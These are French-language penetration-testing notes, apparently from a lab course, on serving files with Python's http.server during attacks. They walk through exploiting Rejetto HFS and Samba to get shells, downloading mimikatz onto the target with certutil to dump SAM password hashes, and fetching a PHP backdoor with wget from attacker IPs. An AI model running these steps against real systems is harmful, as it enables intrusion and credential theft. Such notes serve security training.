
SimpleHTTPServer (python2)  
http.server (python3)  

- SimpleHTTPServer (python2) : `python -m SimpleHTTPServer 80` : par defaut le serveur est créé sur la machine locale.   

- http.server (python3) : `python3 -m http.server 80`  
Ouvrir page web et rentrer notre IP, on arrive dans notre dossier courant.  


**Envoyer de fichiers sur Windows à partir de Rejetto :**
Exploit avec Rejetto :

`search rejetto` : choisir : Rejetto HTTP File Server (HFS) 2.3.x - Remote Comm | windows/remote/39161.py  
dl le script : `searchsploit -m 39161.py` et regarder les commentaires du script pour adapter, en rentrant IP cible + port et IP attaquant + port.  

côté attaquant ouvrir un port `nc -lvnp 1234` et comme précisé dans le script, sur un autre shell il faut être dans le dossier de nc.exe donc dans `/usr/share/windows-binaries` (qui contient nc.exe), puis lancer `python3 -m http.server 80` comme précisé dans le script  
Dans un 3ème shell : `python 39161.py IP_TARGET 80`, lancer plusieurs fois pour avoir le reverse shell sur le listener (nc), comme précisé dans le script.  

On obtient un shell sur la cible : `whoami`, puis `whoami /priv` pour les droits.  

On stope le serveur Web (le shell de python3 -m http.server), puis on se place dans `/usr/share/windows-resources/mimikatz/x64`, qui contient mimikatz et on relance le serveur `python3 -m http.server`.  

Sur le shell obtenu précédemment avec netcat, on lance `certutil -urlcache -f http://10.10.49.5/mimikatz.exe mimikatz.exe` pour uploader mimikatz.exe sur la cible.  
Exécuter mimikatz : `.\mimikatz.exe`, puis `privilege::debug`, `lsadump::sam` pour dumper les hashes.  


**Envoyer de fichiers sur Linux à partir de Samba :**
le scan révèle un server SAMBA smbd 3.X - 4.X  
dans msfconsole : `use exploit/linux/samba/is_known_pipename` et mettre le RHOSTS  
`cd /usr/share/webshells/php/` et démarrer un web server `python3 -m http.server 80`  
côté cible (depuis le shell obtenu sur msfconsole) : `wget http://192.217.117.2/php-backdoor.php` et l'upload du fichier est fait. 
